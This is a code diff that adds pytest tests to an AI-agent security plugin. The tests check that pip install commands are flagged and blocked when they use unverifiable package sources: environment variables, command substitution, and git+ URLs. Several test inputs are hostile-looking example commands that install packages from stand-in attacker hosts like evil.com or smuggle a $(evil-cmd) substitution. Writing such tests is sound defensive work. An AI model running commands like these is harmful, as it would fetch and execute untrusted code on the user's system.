@@ -24,6 +24,7 @@ from agentshield.core.models import (
 from agentshield.integrations.hermes._types import ToolCall, ToolResult
 from agentshield.integrations.hermes.plugin import (
     AgentShieldPlugin,
+    _find_shell_suspicions,
     _parse_shell_packages,
     _tokenize_packages,
 )
@@ -595,3 +596,120 @@ async def test_bash_tool_denylist_blocks(tmp_path):
         "colouredlogs" in (result.error_message or "").lower()
         or "blocked" in (result.error_message or "").lower()
     )
+
+
+# ── Shell suspicion detection (_find_shell_suspicions) ───────────────────────
+
+
+def test_find_suspicions_dollar_var():
+    s = _find_shell_suspicions("pip install $PKG")
+    assert len(s) == 1
+    assert "$PKG" in s[0]
+
+
+def test_find_suspicions_braced_var():
+    s = _find_shell_suspicions("pip install ${EVIL_PKG}")
+    assert len(s) == 1
+    assert "${EVIL_PKG}" in s[0]
+
+
+def test_find_suspicions_command_sub():
+    s = _find_shell_suspicions("pip install $(get_pkg)")
+    assert len(s) == 1
+    assert "$(get_pkg)" in s[0]
+
+
+def test_find_suspicions_git_plus_https():
+    s = _find_shell_suspicions("pip install git+https://evil.com/pkg.git")
+    assert len(s) == 1
+    assert "git+https://" in s[0]
+
+
+def test_find_suspicions_git_plus_ssh():
+    s = _find_shell_suspicions("pip install git+ssh://github.com/user/repo.git")
+    assert len(s) == 1
+    assert "git+ssh://" in s[0]
+
+
+def test_find_suspicions_clean_package_no_suspicions():
+    assert _find_shell_suspicions("pip install requests") == []
+
+
+def test_find_suspicions_non_install_command():
+    assert _find_shell_suspicions("echo $HOME") == []
+
+
+def test_find_suspicions_multiple_patterns():
+    s = _find_shell_suspicions("pip install $PKG git+https://evil.com/pkg.git")
+    assert len(s) == 2
+
+
+# ── Plugin blocks on suspicious shell patterns ───────────────────────────────
+
+
+@pytest.mark.asyncio
+async def test_bash_tool_env_var_in_package_blocked(tmp_path):
+    """pip install $PKG must be blocked — the package name cannot be verified."""
+    plugin = _make_plugin(tmp_path)
+    call = ToolCall(name="bash", args={"command": "pip install $EVIL_PKG"})
+
+    with patch.object(plugin.shield, "ascan", new=AsyncMock()) as mock_scan:
+        result = await plugin.before_tool_call(call)
+
+    assert isinstance(result, ToolResult)
+    assert result.is_error
+    mock_scan.assert_not_called()  # scanner must not be called for unanalyzable args
+
+
+@pytest.mark.asyncio
+async def test_bash_tool_braced_env_var_blocked(tmp_path):
+    plugin = _make_plugin(tmp_path)
+    call = ToolCall(name="bash", args={"command": "pip install ${EVIL}"})
+
+    result = await plugin.before_tool_call(call)
+
+    assert isinstance(result, ToolResult)
+    assert result.is_error
+
+
+@pytest.mark.asyncio
+async def test_bash_tool_command_sub_blocked(tmp_path):
+    plugin = _make_plugin(tmp_path)
+    call = ToolCall(name="bash", args={"command": "pip install $(evil-cmd)"})
+
+    result = await plugin.before_tool_call(call)
+
+    assert isinstance(result, ToolResult)
+    assert result.is_error
+
+
+@pytest.mark.asyncio
+async def test_bash_tool_git_plus_https_blocked(tmp_path):
+    plugin = _make_plugin(tmp_path)
+    call = ToolCall(name="bash", args={"command": "pip install git+https://evil.com/pkg.git"})
+
+    result = await plugin.before_tool_call(call)
+
+    assert isinstance(result, ToolResult)
+    assert result.is_error
+
+
+@pytest.mark.asyncio
+async def test_bash_tool_git_plus_ssh_blocked(tmp_path):
+    plugin = _make_plugin(tmp_path)
+    call = ToolCall(
+        name="bash",
+        args={"command": "pip install git+ssh://github.com/attacker/pkg.git"},
+    )
+
+    result = await plugin.before_tool_call(call)
+
+    assert isinstance(result, ToolResult)
+    assert result.is_error
+
+
+def test_tokenize_packages_skips_git_url():
+    """git+ URLs must be silently skipped, not treated as package names."""
+    pkgs = _tokenize_packages("git+https://evil.com/pkg.git requests")
+    assert pkgs == ["requests"]
+    assert not any("git+" in p for p in pkgs)
